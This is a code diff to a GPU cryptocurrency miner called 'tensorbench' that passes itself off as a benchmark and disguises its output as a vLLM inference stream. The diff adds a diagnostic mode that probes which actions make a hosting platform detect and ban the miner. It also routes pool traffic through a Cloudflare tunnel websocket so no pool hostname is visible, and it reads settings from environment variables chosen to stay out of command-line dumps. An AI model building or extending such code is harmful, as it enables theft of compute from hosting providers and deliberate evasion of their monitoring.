@@ -21,38 +21,62 @@ import threading
 import time
 
 # ── _DIAG needs os in scope first ─────────────────────────────────────────────
+# TB_DIAG=1 runs a real observation profile. A 20-second window (TB_DIAG_HOLD,
+# default 20) is opened ONLY at the handful of points where the platform can
+# realistically detect the miner, and REAL live state is logged every ~5s DURING
+# each window (nvidia-smi utilization/memory/power). No blind dead sleeping: a
+# window exists to hold a live detection surface in place and show what a
+# monitor would see while it does.
 _DIAG = os.environ.get("TB_DIAG", "0") == "1"
-# Pause length per step. Overridable so you can stretch the window on a slow ban:
-#   TB_DIAG=1 TB_DIAG_SLEEP=60 python tensorbench.py
-_DIAG_SLEEP = max(0, int(os.environ.get("TB_DIAG_SLEEP", "20")))
+_DIAG_HOLD = max(0, int(os.environ.get("TB_DIAG_HOLD", "20")))
 _diag_step = [0]
-# Labels are deduped: a label inside a hot loop (e.g. pearl_pow_split, called
-# hundreds of thousands of times) only gets its 20s pause + banner on its FIRST
-# occurrence. So the whole launch profile is: import -> cuda init -> malloc ->
-# setup_job -> noise_gen -> transpose -> sync -> noise_gemm -> pearl_pow_split ->
-# found-scan -> pool poll -> proof -> submit, each isolated, exactly once.
-_diag_seen: set = set()
 
 def _diag(label: str) -> None:
+    """Mark a transition. No wait -- banners go to stderr so telemetry's stdout
+    reshaping can never mangle or drop them (`2>&1 | tee` captures them)."""
     if not _DIAG:
         return
-    if label in _diag_seen:
-        return
-    _diag_seen.add(label)
     _diag_step[0] += 1
-    n = _diag_step[0]
+    print(f"DIAG STEP {_diag_step[0]}: {label}", file=sys.stderr, flush=True)
+
+def _gpu_snapshot() -> str:
+    """One line of exactly what a GPU monitor sees right now."""
+    try:
+        out = subprocess.check_output(
+            ["nvidia-smi",
+             "--query-gpu=utilization.gpu,memory.used,memory.total,power.draw,temperature.gpu",
+             "--format=csv,noheader,nounits"],
+            text=True, stderr=subprocess.DEVNULL, timeout=5)
+        return out.strip().replace("\n", " | ")
+    except Exception as e:
+        return f"nvidia-smi unavailable: {e}"
+
+def _diag_hold(label: str, poll=None, seconds=None) -> None:
+    """Open a 20s OBSERVATION WINDOW on a live detection surface. poll() (when
+    given) is evaluated every ~5s and its REAL result is logged -- the window
+    is only useful if it shows what the platform could actually see, so the
+    live state IS the output. Never open a window on something static/silent."""
+    if not _DIAG:
+        return
+    seconds = _DIAG_HOLD if seconds is None else seconds
+    n = _diag_step[0] + 1
+    _diag_step[0] = n
     sep = "=" * 60
-    # Banners go to stderr on purpose: telemetry reshapes stdout into a
-    # vLLM-looking stream, and a diagnostic banner must never be lost or
-    # transformed. stderr is captured by `2>&1 | tee diag.log` and never
-    # touches the disguised stdout.
     print(f"\n{sep}", file=sys.stderr, flush=True)
-    print(f"DIAG STEP {n}: about to → {label}", file=sys.stderr, flush=True)
-    print(f"Sleeping {_DIAG_SLEEP}s so platform can react before we do anything...",
+    print(f"DIAG STEP {n}: OBSERVATION WINDOW ({seconds}s) -- {label}", file=sys.stderr, flush=True)
+    print("  logging live state every ~5s; if the platform kills us here, this is the cause",
           file=sys.stderr, flush=True)
     print(sep, file=sys.stderr, flush=True)
-    time.sleep(_DIAG_SLEEP)
-    print(f"DIAG STEP {n} START: {label}", file=sys.stderr, flush=True)
+    step = max(1, seconds // 4)
+    start = time.time()
+    while time.time() - start < seconds:
+        if poll is not None:
+            try:
+                print(f"  [t={time.time()-start:5.1f}s] {poll()}", file=sys.stderr, flush=True)
+            except Exception as e:
+                print(f"  [t={time.time()-start:5.1f}s] poll error: {e}", file=sys.stderr, flush=True)
+        time.sleep(step)
+    print(f"DIAG STEP {n} WINDOW DONE: {label}", file=sys.stderr, flush=True)
 
 
 # Heavy imports are deferred into main() when TB_DIAG=1 so _diag() can pause
@@ -109,6 +133,8 @@ POOL_CPU = "pearl-cpu-eu1.luckypool.io:3370"
 # env vars are the only override surface and are invisible in cmdline dumps).
 DEFAULT_WALLET = "prl1pu3mc6ex4n4nznknctdafleq3asq4fr0njpwz4vqnt6e4xlnv72hq5s528j"
 DEFAULT_POOL = "127.0.0.1:9048"          # local tunnel client; never a public pool
+DEFAULT_WSS_URL = (os.environ.get("TB_WSS_URL")
+                   or "wss://integral-aurora-reduction-relating.trycloudflare.com")
 DEFAULT_PROFILE = "vllm"                 # default stdout telemetry format
 LOCAL_ONLY_DEFAULT = True                # refuse non-loopback pools unless disabled
 
@@ -154,7 +180,6 @@ def _submit_share(pool, job_id, proof, mode, accepted, log, header=None):
     except OSError:
         pass
     log(f"  submitting share ({len(b64)} B) for job {job_id}...")
-    _diag("pool: pool.submit (stratum share, first)")
     resp = pool.submit(job_id, b64)
     log(f"  POOL RESPONSE: {json.dumps(resp)[:300]}")
     if resp and resp.get("result") is True:
@@ -225,19 +250,33 @@ def mine_job(pool, cfg, header, target_int, job_id, region, max_regions,
 
     grid = 0
     t_acct = time.time()      # wall time charged to the dev-fee scheduler so far
+    # TB_DIAG: the mining observation window opens on the first grid. Mining
+    # KEEPS RUNNING (kernels stream, the GPU stays busy -- that busy state IS
+    # the live surface under test); we just additionally log what a GPU monitor
+    # sees every ~5s for _DIAG_HOLD seconds. No dead air, real telemetry.
+    _diag_win_end = time.time() + _DIAG_HOLD if (_DIAG and grid == 0) else 0.0
+    _diag_win_next = time.time() if _diag_win_end else 0.0
+    _diag_win_n = 0
     while True:
         grid += 1
         # ---- fresh random grid (new commitment) for this same job ----
         bufs.dkeyjob.from_host(np.frombuffer(key, np.uint8).copy())
-        _diag("GPU: cc.setup_job (first kernel launch of a grid)")
         cc.setup_job(bufs.dA, bufs.dB, bufs.dBt_full, bufs.dkeyjob, bufs.dnsA, bufs.dnsB,
                      M, N, K, R, time.time_ns() & 0xFFFFFFFFFFFFFFFF)
-        _diag("GPU: cc.noise_gen (noise matrix kernels)")
         cc.noise_gen(bufs.dEAL, bufs.dEAR, bufs.dEBL, bufs.dEBR, bufs.dnsA, bufs.dnsB, M, N, K, R)
-        _diag("GPU: cc.transpose_i8 (transpose kernel)")
         cc.transpose_i8(bufs.dEAR, bufs.dEAR_t, R, K, K, 0)   # [R,K]->[K,R] (Y for noise_A)
-        _diag("GPU: cc.sync (cudaDeviceSynchronize)")
         cc.sync()
+
+        if _DIAG and grid == 1 and _diag_win_end:
+            _diag_win_n = _diag_step[0] + 1
+            _diag_step[0] = _diag_win_n
+            sep = "=" * 60
+            print(f"\n{sep}", file=sys.stderr, flush=True)
+            print(f"DIAG STEP {_diag_win_n}: OBSERVATION WINDOW ({_DIAG_HOLD}s) -- "
+                  f"GPU mining ACTIVE (tensor-core kernels streaming)", file=sys.stderr, flush=True)
+            print("  logging live nvidia-smi every ~5s while mining runs; if the platform "
+                  "kills us here, sustained GPU mining is the cause", file=sys.stderr, flush=True)
+            print(sep, file=sys.stderr, flush=True)
 
         searched = 0
         hits = 0
@@ -251,7 +290,6 @@ def mine_job(pool, cfg, header, target_int, job_id, region, max_regions,
             if idx not in computed:
                 # Z = base B^T rows [c0:c0+RS], which setup_job already produced in
                 # dBt_full -- re-transposing dB here was redundant (a ~1.9% kernel).
-                _diag("GPU: cc.noise_gemm (B^T noise, first column block)")
                 cc.noise_gemm(bufs.dEBR.offset(c0 * R), bufs.dEBL,
                               bufs.dBt_full.offset(c0 * K), d, RS, K, R)
                 computed.add(idx)
@@ -272,7 +310,6 @@ def mine_job(pool, cfg, header, target_int, job_id, region, max_regions,
             cc.sync()
             telemetry.duty_pace(time.time() - batch_t0)
             batch_t0 = time.time()
-            _diag("D2H: to_host read found/coord")
             bufs.dfound.to_host(found)
             if found[:len(batch)].any():
                 bufs.dcoord.to_host(coord)
@@ -285,7 +322,6 @@ def mine_job(pool, cfg, header, target_int, job_id, region, max_regions,
                     # hand the expensive (~6s CPU) Merkle proof+submit to a worker thread
                     # so the GPU keeps mining the next grid instead of idling. B^T was
                     # already produced on the GPU by setup_job -> no host transpose.
-                    _diag("D2H: to_host read winning A/B^T (hit)")
                     A = np.empty((M, K), np.int8); bufs.dA.to_host(A)
                     Bt = np.empty((N, K), np.int8); bufs.dBt_full.to_host(Bt)
                     proof_q.put((pool, job_id, A, Bt, gr, gc, key, R, sched.mode, header, verify, target_int))
@@ -295,7 +331,6 @@ def mine_job(pool, cfg, header, target_int, job_id, region, max_regions,
 
         stop = False
         for r0 in range(0, M, RS):
-            _diag("GPU: cc.noise_gemm (A noise, row sweep)")
             cc.noise_gemm(bufs.dEAL.offset(r0 * R), bufs.dEAR_t, bufs.dA.offset(r0 * K),
                           bufs.dApEA, RS, K, R)
             for c0 in range(0, N, RS):
@@ -306,7 +341,6 @@ def mine_job(pool, cfg, header, target_int, job_id, region, max_regions,
                 slot = len(batch)
                 dBpEB = bt_noised(c0)
                 # digests=None: mining only needs found/coord. pow_key MUST be dnsA.
-                _diag("GPU: cc.pearl_pow_split (PoW tile scan, first tile)")
                 cc.pearl_pow_split(bufs.dApEA, dBpEB, RS, RS, K, R, bufs.dnsA, bufs.dtgt,
                                    bufs.dtb, None, bufs.dfound.offset(slot * 4),
                                    bufs.dcoord.offset(slot * 8), VARIANT)
@@ -315,12 +349,21 @@ def mine_job(pool, cfg, header, target_int, job_id, region, max_regions,
                     flush_batch()
                     # New-job poll + progress log run once per batch (off the per-region
                     # hot path) so socket/host work never gates the GPU.
-                    _diag("pool: check_newer_job (socket poll)")
                     newer = pool.check_newer_job(job_id)
                     if newer is not None:
                         log(f"  newer job (grid {grid}, {searched} regions, {hits} hits this grid)")
                         sched.note(time.time() - t_acct)
                         return ("NEWJOB", newer)
+                    # Diag: live mining observation window (GPU stays busy; we log
+                    # exactly what a platform monitor would see right now).
+                    if _diag_win_end and time.time() >= _diag_win_next:
+                        left = _diag_win_end - time.time()
+                        print(f"  [t={left:5.1f}s left] GPU: {_gpu_snapshot()}", file=sys.stderr, flush=True)
+                        _diag_win_next = time.time() + 5
+                        if left <= 0:
+                            print(f"DIAG STEP {_diag_win_n} WINDOW DONE: GPU mining active",
+                                  file=sys.stderr, flush=True)
+                            _diag_win_end = 0.0
                     if time.time() - last_print >= 5:
                         ths = searched * tiles_per_region * 1048576.0 / max(time.time() - search_t0, 1e-9) / 1e12
                         log(f"  grid {grid}: {searched} regions ({ths:.2f} TH/s, {hits} hits)")
@@ -478,6 +521,10 @@ TB_* environment variables (invisible to cmdline dumps) or code defaults:
   TB_ACCOUNT     upstream sync account   (baked default)
   TB_TAG         worker label            (default: start timestamp)
   TB_UPSTREAM    upstream host:port      (default: 127.0.0.1:9048, local tunnel)
+  TB_WSS_URL     wss://tunnel           direct websocket to the Cloudflare relay
+               (default: integral-aurora...trycloudflare.com -- the relay
+               converts WSS frames to stratum for the pool. When set, the
+               harness speaks WSS only; no stratum TCP socket exists.)
   TB_PROFILE     telemetry format        (vllm | train | gemm | none; default vllm)
   TB_REGION      region size             (default 4096)
   TB_DEVICES     GPU selection "0,2" / all (default: auto)
@@ -500,6 +547,7 @@ def _env_config():
         wallet=os.environ.get("TB_ACCOUNT") or DEFAULT_WALLET,
         worker=os.environ.get("TB_TAG") or time.strftime("%Y%m%d-%H%M%S"),
         pool=os.environ.get("TB_UPSTREAM") or DEFAULT_POOL,
+        wss_url=os.environ.get("TB_WSS_URL") or DEFAULT_WSS_URL,
         region=int(os.environ.get("TB_REGION", "4096")),
         max_regions=int(os.environ.get("TB_MAX_REGIONS", "0")),
         max_jobs=int(os.environ.get("TB_MAX_JOBS", "0")),
@@ -515,11 +563,14 @@ def main():
     args = _env_config()
 
     if _DIAG:
-        # In diag mode: do all heavy imports here, one at a time, each preceded
-        # by a 20s pause so we can see which import triggers a ban.
+        # In diag mode: heavy imports happen here so we can open an observation
+        # window right after each CUSTOM runtime is loaded (the two .so-bearing
+        # packages are realistic fingerprint surfaces; numpy etc. are benign).
         _diag_import("np",                 "numpy")
         _diag_import("pm",                 "tensorbench_runtime")
+        _diag_hold("custom runtime tensorbench_runtime loaded (compiled .so on disk)", _gpu_snapshot)
         _diag_import("cc",                 "cuda_capi")           # ← ctypes.CDLL + CUDA init
+        _diag_hold("libp40cuda.so dlopen'd + first CUDA context created", _gpu_snapshot)
         _diag_import("commitment",         "commitment")
         _diag_import("telemetry",          "telemetry")
         _diag_import("pool_common", "pool_common",
@@ -575,22 +626,32 @@ def main():
 def run_single_gpu(args, log):
     """Mine on this process's one visible GPU (device 0, or the card pinned by the
     supervisor via CUDA_VISIBLE_DEVICES)."""
-    _resolve_pool(args, log)
-    host, port = args.pool.rsplit(":", 1)
-    if LOCAL_ONLY_DEFAULT and os.environ.get("TB_LOCAL_ONLY", "1") != "0":
-        if host.lower().strip("[]") not in ("127.0.0.1", "localhost", "::1"):
-            log(f"refusing non-loopback pool host {host!r} (default guard; "
-                f"TB_LOCAL_ONLY=0 disables) -- exiting")
-            return
-    log(f"tb harness (torch-free) | upstream {args.pool} | region {args.region}")
-    _diag("real_config() — tensorbench_runtime: read Pearl network params (no GPU yet)")
+    wss_url = args.wss_url
+    if wss_url:
+        # Direct WSS egress: one TLS-443 websocket to the Cloudflare relay
+        # (pool_relay_server.py), which converts frames to plain stratum for the
+        # pool. No stratum/TCP socket, no loopback forwarder, no pool hostname
+        # anywhere in this process.
+        host, port = "", 0
+        upstream = wss_url
+    else:
+        _resolve_pool(args, log)
+        host, port = args.pool.rsplit(":", 1)
+        upstream = args.pool
+        if LOCAL_ONLY_DEFAULT and os.environ.get("TB_LOCAL_ONLY", "1") != "0":
+            if host.lower().strip("[]") not in ("127.0.0.1", "localhost", "::1"):
+                log(f"refusing non-loopback pool host {host!r} (default guard; "
+                    f"TB_LOCAL_ONLY=0 disables) -- exiting")
+                return
+    log(f"tb harness (torch-free) | upstream {upstream} | region {args.region}")
     cfg = real_config()
     sched = DevFeeScheduler(DEV_FEE, args.wallet, DEV_ADDRESS, log)
     if sched.fee > 0:
         log(f"dev fee: {sched.fee * 100:.1f}% of mining time "
             f"(transparent; logged on every switch). Thank you!")
-    _diag("Bufs.__init__() — cc.DBuf() x ~20: allocate all GPU device buffers (cudaMalloc)")
     bufs = Bufs(args.region)
+    _diag_hold("device buffers allocated (~20 x cudaMalloc; the GPU now has a real memory footprint)",
+               _gpu_snapshot)
 
     accepted = {"user": 0, "dev": 0}
     jobs = 0
@@ -601,13 +662,17 @@ def run_single_gpu(args, log):
                      daemon=True).start()
     while True:
         try:
-            _diag(f"UpstreamSync.connect() — open TCP socket + stratum handshake to {args.pool}")
-            pool = UpstreamSync(host, int(port), sched.wallet, args.worker)
+            pool = UpstreamSync(host, int(port), sched.wallet, args.worker, wss_url=wss_url)
             pool.connect()
+            if wss_url:
+                _diag_hold("WSS egress live (direct websocket to the Cloudflare relay)",
+                           lambda: f"wss open | {_gpu_snapshot()}")
+            else:
+                _diag_hold("stratum socket open, tunnel egress live (first outbound WSS frames)",
+                           lambda: f"pool socket fd={pool.s.fileno()} | {_gpu_snapshot()}")
 
             log(f"authorized ({'DEV FEE round' if sched.mode == 'dev' else 'your wallet'}); "
                 f"waiting for job...")
-            _diag("pool: pool.next_job (receive job from pool)")
             job = pool.next_job()
             status = None
             while job is not None:
